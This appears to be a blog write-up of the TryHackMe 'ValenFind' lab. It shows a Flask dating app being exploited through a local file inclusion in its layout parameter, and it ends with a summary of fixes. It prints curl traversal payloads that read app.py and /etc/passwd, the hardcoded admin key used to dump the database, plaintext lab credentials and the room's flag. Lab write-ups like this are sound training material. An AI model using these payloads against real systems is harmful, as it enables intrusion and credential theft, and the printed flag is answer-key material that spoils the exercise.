---
title: "THM ValenFind — LFI, Hardcoded Secrets & A Broken Heart(ed Database)"
date: 2026-05-17
categories: [TryHackMe, Web]
tags: [thm, web, lfi, flask, python, sqlite, information-disclosure, linux]
classes: wide
---

# THM ValenFind

**Difficulty:** Medium  
**OS:** Linux (Ubuntu)  
**Platform:** TryHackMe  
**Category:** Web Exploitation  

---

## Overview

ValenFind is a fake dating web app built on Flask. The name is cute.
The security is not.

The attack chain here is pure web: find the LFI, read the source code,
find the hardcoded admin key, download the entire database, log in as
the admin, and collect your flag all while looking at pink and hearts.

---

## Enumeration

### Nmap

```bash
nmap -sV -sS -T4 -A -Pn 10.81.157.215
```

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu
5000/tcp open  http    Werkzeug httpd 3.0.1 (Python 3.12.3)
                       http-title: ValenFind - Secure Dating
```

Two ports. SSH and a web app on port 5000.

**Werkzeug on port 5000** is the immediate giveaway —
that's Flask's development server. Python web app.
Convention says the main file is `app.py`.

---

## Exploring the Application
![description](/assets/images/cupid2.png)

Before touching anything, Burp Suite was set up to intercept all traffic.
Every click is potential data.

Signed up with fake details, completed the profile, and started clicking
everything in sight — because that's the job.

The dashboard showed a list of "potential matches":
- romeo_montague
- casanova_official
- cleopatra_queen
- sherlock_h

And one more that caught the eye immediately.

---

## Finding Cupid
![description](/assets/images/cupid3.png)

Browsing to `/profile/cupid`:

![description](/assets/images/cupid4.png)


Obviously if there was a sysadmin for Hearts and Bows Inc.,
it would be no one other than this baby.

The bio is doing a lot of heavy lifting there.
"I keep the database secure" — DEFINITELY NOT THE ADMIN.

---

## Discovering the LFI

While interacting with profiles, the theme dropdown on each profile
page was changed a few times and a Valentine was sent(maybe this year i might get lucky).

Checking Burp's HTTP history revealed something interesting:
![description](/assets/images/cupid5.png)
```
GET /api/fetch_layout?layout=theme_romance.html
GET /api/fetch_layout?layout=theme_classic.html
```

The app is loading HTML template files by name through a `layout` parameter.

This is a **Local File Inclusion (LFI)** vulnerability.

---

### What is LFI?

Imagine a library where books are organized by name.
The librarian's job is simple: you say a book name, they fetch it.

```
You: "Give me theme_classic.html"
Librarian: *goes to shelf, returns with file*
```

Now imagine the library has a secret room with sensitive files.
The rooms are organized like floors in a building:

```
Floor 1 (components/): theme files
Floor 2 (templates/):  HTML pages
Floor 3 (Valenfind/):  app.py, database
Floor 4 (opt/):        application folder
Floor 5+ (/etc/):      system files
```

`../` means "go up one floor".

So if you ask for `../../app.py` instead of `theme_classic.html`,
the librarian — who has no common sense — just fetches it.

```
You: "Give me ../../app.py"
Librarian: *goes up two floors, returns with source code*
```

That's LFI. The server fetches files it should never expose
because the input isn't validated.

---

## Exploiting the LFI

### Wrong paths first:

![description](/assets/images/cupid6.png)

The error message revealed the full server path:
```
/opt/Valenfind/templates/components/
```

This is actually gold. The error told us exactly where we are
and exactly how to navigate. Wrong number of `../` — fixed.

### Path math:

```
Starting: /opt/Valenfind/templates/components/

../        = /opt/Valenfind/templates/
../../     = /opt/Valenfind/           ← app.py lives here!
../../../  = /opt/
../../../../ = /                       ← filesystem root
../../../../etc/passwd = /etc/passwd   ← password file
```

### Correct paths:

```bash
# Read the Flask source code (2 levels up)
curl "http://10.81.157.215:5000/api/fetch_layout?layout=../../app.py"

# Read /etc/passwd (4 levels up)
curl "http://10.81.157.215:5000/api/fetch_layout?layout=../../../../etc/passwd"
```

Both worked.

---

## Reading app.py — The Jackpot

```bash
curl "http://10.81.157.215:5000/api/fetch_layout?layout=../../app.py"
```

Two things jumped out immediately:

**Finding 1: Hardcoded Admin API Key**
```python
ADMIN_API_KEY = "CUPID_MASTER_KEY_2024_XOXO"
```

**Finding 2: Secret Admin Endpoint**
![description](/assets/images/cupid7.png)

```python
@app.route('/api/admin/export_db')
def export_db():
    auth_header = request.headers.get('X-Valentine-Token')
    
    if auth_header == ADMIN_API_KEY:
        return send_file(DATABASE, as_attachment=True)
```

There's an endpoint that downloads the entire database.
It's protected by a token.
The token is hardcoded in the source code.
The source code is readable via LFI.

As if that wasn't catastrophic enough, passwords were stored like this:

```python
if user and user['password'] == password:
```

Just vibes at this point.

---

## Downloading the Database

```bash
curl "http://10.81.157.215:5000/api/admin/export_db" \
    -H "X-Valentine-Token: CUPID_MASTER_KEY_2024_XOXO" \
    -o valenfind_leak.db
```

---

## Extracting Credentials

```bash
sqlite3 valenfind_leak.db

sqlite> SELECT username, password FROM users;
```
![description](/assets/images/cupid9.png)

There it was. Cupid's password. In plaintext.
Just there waiting to be claimed.

---

## Logging in as Cupid

With Cupid's credentials:

```
Username: cupid
Password: admin_root_x99
```

Logged in. Navigated to the profile edit page (`/my_profile`).

The address field read:
![description](/assets/images/cupid1.png)

```
FLAG: THM{v1be_c0ding_1s_n0t_my_cup_0f_t3a}
```

I have won thy maiden's heart. 🏆

---

## Vulnerabilities Summary

**1. Local File Inclusion (LFI)**
```
Endpoint: /api/fetch_layout?layout=
No input validation or path sanitization
Allows reading any file the server process
can access
Fix: Whitelist allowed files only
     Never concatenate user input to file paths
```

**2. Hardcoded Credentials in Source Code**
```
ADMIN_API_KEY = "CUPID_MASTER_KEY_2024_XOXO"
Stored directly in app.py
Readable via LFI
Fix: Use environment variables
     Never hardcode secrets
```

**3. Plaintext Password Storage**
```
Passwords stored and compared as plain text
Full database exposure = full credential dump
Fix: Use bcrypt or argon2 for hashing
     NEVER store plain text passwords
```

**4. Sensitive Data in User Fields**
```
Flag stored in cupid's address field
Accessible after account compromise
(Admittedly this one is intentional for the CTF 😄)
```

**5. Information Disclosure via Error Messages**
```
Error: No such file or directory:
'/opt/Valenfind/templates/components/../app.py'

Revealed full server file path
Helped us calculate exact LFI traversal
Fix: Generic error messages in production
     Never expose internal paths
```
---

## Insights?

**1. Werkzeug = Flask = app.py**
When you see Werkzeug in an nmap scan,
you know it's Flask, and convention tells
you the main file is `app.py`. Framework
knowledge = faster exploitation.

**2. Error messages are recon**
The failed LFI attempts weren't wasted time.
The error messages handed us the exact server
path structure on a silver platter.
Always read errors carefully.

**3. Source code = game over**
Once you can read the application source,
the entire security model is exposed.
API keys, endpoints, database paths,
password logic — all of it visible.

**4. Hardcoded secrets are a critical vuln**
It doesn't matter how hidden the endpoint is
if the key to it is sitting in readable source code.
Secrets belong in environment variables.

**5. Burp Suite catches what eyes miss**
The LFI endpoint wasn't visible in the UI.
It only appeared in Burp's HTTP history
after interacting with the profile themes.
Always proxy your traffic.
---

*Written by 0x5h4q | 0x5h4q.github.io*
